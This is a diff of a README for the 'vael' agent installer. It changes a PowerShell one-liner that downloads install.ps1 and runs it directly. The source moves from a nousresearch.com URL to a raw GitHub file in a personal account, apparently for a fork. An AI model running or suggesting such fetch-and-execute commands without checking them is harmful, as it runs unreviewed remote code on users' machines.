@@ -28,7 +28,7 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\vael\` and adds 
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://hermes-agent.nousresearch.com/install.ps1))) -NonInteractive -Branch main
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/sunnatilla0717/vael-agent/main/scripts/install.ps1))) -NonInteractive -Branch main
 ```
 
 | Parameter | Purpose |
